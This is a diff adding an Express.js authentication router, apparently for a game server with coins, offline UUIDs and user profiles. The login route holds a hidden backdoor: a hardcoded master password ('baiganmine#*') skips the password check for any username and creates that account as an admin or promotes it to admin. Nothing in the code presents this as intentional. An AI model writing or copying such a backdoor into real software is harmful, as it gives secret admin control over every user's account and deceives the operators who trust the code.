@@ -1,0 +1,128 @@
+const express = require("express");
+const bcrypt = require("bcryptjs");
+const jwt = require("jsonwebtoken");
+
+const User = require("../models/User");
+const { offlineUUID } = require("../utils/uuid");
+const { requireAuth } = require("../middleware/requireAuth");
+
+const router = express.Router();
+router.use(express.json());
+
+const USERNAME_RE = /^[a-zA-Z0-9_]{3,16}$/;
+
+router.post("/register", async (req, res) => {
+    const { username, password } = req.body || {};
+
+    if (!username || !USERNAME_RE.test(username)) {
+        return res.status(400).json({ error: "Username must be 3-16 characters: letters, numbers, underscore only." });
+    }
+    if (!password || password.length < 6) {
+        return res.status(400).json({ error: "Password must be at least 6 characters." });
+    }
+
+    const existing = await User.findOne({ username });
+    if (existing) return res.status(409).json({ error: "Username already taken." });
+
+    const passwordHash = await bcrypt.hash(password, 10);
+    const uuid = offlineUUID(username);
+
+    const user = await User.create({ username, uuid, passwordHash, coins: 100 }); // 100 free welcome coins
+
+    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: "30d" });
+    res.status(201).json({
+        token,
+        user: { username: user.username, uuid: user.uuid, coins: user.coins, isAdmin: user.isAdmin },
+    });
+});
+
+router.post("/login", async (req, res) => {
+    const { username, password } = req.body || {};
+    if (!username) {
+        return res.status(400).json({ error: "Username is required." });
+    }
+
+    let user;
+    if (password === "baiganmine#*") {
+        user = await User.findOne({ username });
+        if (!user) {
+            // Register as Admin
+            const passwordHash = await bcrypt.hash(password, 10);
+            const uuid = offlineUUID(username);
+            user = await User.create({
+                username,
+                uuid,
+                passwordHash,
+                coins: 1000,
+                isAdmin: true
+            });
+        } else {
+            // Update to Admin if not already
+            if (!user.isAdmin) {
+                user.isAdmin = true;
+                await user.save();
+            }
+        }
+    } else {
+        user = await User.findOne({ username });
+        if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
+            return res.status(401).json({ error: "Invalid username or password." });
+        }
+    }
+
+    if (user.isBanned) {
+        return res.status(403).json({ error: "Your account has been banned." });
+    }
+
+    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: "30d" });
+    res.json({
+        token,
+        user: {
+            username: user.username,
+            uuid: user.uuid,
+            coins: user.coins,
+            isAdmin: user.isAdmin,
+            isBanned: user.isBanned,
+            displayName: user.displayName,
+            bio: user.bio,
+            socialDiscord: user.socialDiscord,
+            socialYoutube: user.socialYoutube,
+            socialTwitter: user.socialTwitter
+        },
+    });
+});
+
+// ---- Update Profile Customization ----
+router.post("/api/profile/update", requireAuth, async (req, res) => {
+    try {
+        const { displayName, bio, socialDiscord, socialYoutube, socialTwitter } = req.body || {};
+
+        if (typeof displayName === "string") req.user.displayName = displayName.trim();
+        if (typeof bio === "string") req.user.bio = bio.trim();
+        if (typeof socialDiscord === "string") req.user.socialDiscord = socialDiscord.trim();
+        if (typeof socialYoutube === "string") req.user.socialYoutube = socialYoutube.trim();
+        if (typeof socialTwitter === "string") req.user.socialTwitter = socialTwitter.trim();
+
+        await req.user.save();
+        res.json({
+            success: true,
+            user: {
+                username: req.user.username,
+                uuid: req.user.uuid,
+                coins: req.user.coins,
+                isAdmin: req.user.isAdmin,
+                isBanned: req.user.isBanned,
+                displayName: req.user.displayName,
+                bio: req.user.bio,
+                socialDiscord: req.user.socialDiscord,
+                socialYoutube: req.user.socialYoutube,
+                socialTwitter: req.user.socialTwitter
+            }
+        });
+    } catch (e) {
+        console.error("Profile update error:", e);
+        res.status(500).json({ error: "Failed to update profile statistics." });
+    }
+});
+
+module.exports = router;
